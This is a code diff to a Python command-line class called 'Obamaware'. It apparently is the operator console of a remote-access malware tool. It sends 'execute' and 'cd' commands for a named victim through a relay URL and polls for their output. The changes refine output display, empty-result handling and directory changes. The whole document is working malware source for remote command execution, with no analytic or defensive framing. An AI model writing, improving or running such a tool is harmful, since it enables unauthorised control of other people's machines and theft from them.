@@ -29,8 +29,11 @@ class Obamaware(cmd.Cmd):
     def safe_print(self, text):
         sys.stdout.write("\r")                    # Return to start of line
         sys.stdout.write(" " * (len(self.prompt) + 80)) # Clear the line (arbitrary width)
-        sys.stdout.write("\r")                    # Return to start again
-        print(text+"\n")                               # Print the output
+        sys.stdout.write("\r")  
+        if text:                  # Return to start again
+            print(text+"\n")   
+        else:
+            print("")                            # Print the output
         sys.stdout.write(self.prompt)                  # Reprint the prompt
         sys.stdout.flush()
     
@@ -44,7 +47,7 @@ class Obamaware(cmd.Cmd):
                 response = resp.text.split(" ### ", 1)
                 if "output" in response[0] and not self.lastout:
                     if len(response) > 1:
-                        if "__NO_PAYLOAD__" not in response[1]:
+                        if "__NO_PAYLOAD__" != response[1]:
                             self.inactivitycounter = 0
                             if self.cd:
                                 self.cd = False
@@ -53,6 +56,9 @@ class Obamaware(cmd.Cmd):
                             else:
                                 self.safe_print(f"{Success} {resp.text.split(' ### ', 1)[1].strip()}")
                             self.lastout = True
+                if resp.text == "output ###":
+                    self.safe_print(f"{Success} Command executed successfully with no output.")
+                    self.lastout = True
             except requests.RequestException as e:
                 pass
             if self.inactivitycounter >= 5:
@@ -67,11 +73,11 @@ class Obamaware(cmd.Cmd):
         args = ' '.join([i.strip() for i in line.strip().split(' ') if i])
         self.cd = True
         if args:
-            self.send_request("POST", self.revname, f"cd {args}\ncd").strip("\r\n")
+            self.send_request("POST", self.revname, f"cd {args}", True).strip("\r\n")
         else:
-            self.send_request("POST", self.revname, "cd")
+            self.send_request("POST", self.revname, "cd ", True)
 
-    def send_request(self, mode, name, cmd=None):
+    def send_request(self, mode, name, cmd=None, cd=False):
         if mode == "GET":
             try:
                 resp = requests.post(url, data=body.replace("USER", name), timeout=3)
@@ -94,14 +100,22 @@ class Obamaware(cmd.Cmd):
             except requests.RequestException as e:
                 print(f"{ErrorSign} request failed:", e)
         elif mode == "POST" and cmd:
-            try:
-                resp = requests.post(url, data=body.replace("USER", name).replace("GET", "execute ### " + cmd), timeout=10)
-                self.lastout = False
-                return resp.text
-            except requests.RequestException as e:
-                print("request failed:", e)
-                return
-
+            if cd:
+                try:
+                    resp = requests.post(url, data=body.replace("USER", name).replace("GET", "cd ### " + cmd[3:]), timeout=10)
+                    self.lastout = False
+                    return resp.text
+                except requests.RequestException as e:
+                    print("request failed:", e)
+                    return
+            else:
+                try:
+                    resp = requests.post(url, data=body.replace("USER", name).replace("GET", "execute ### " + cmd), timeout=10)
+                    self.lastout = False
+                    return resp.text
+                except requests.RequestException as e:
+                    print("request failed:", e)
+                    return
     # ----- basic shell commands -----
     def multiline_command(self):
         command = ""
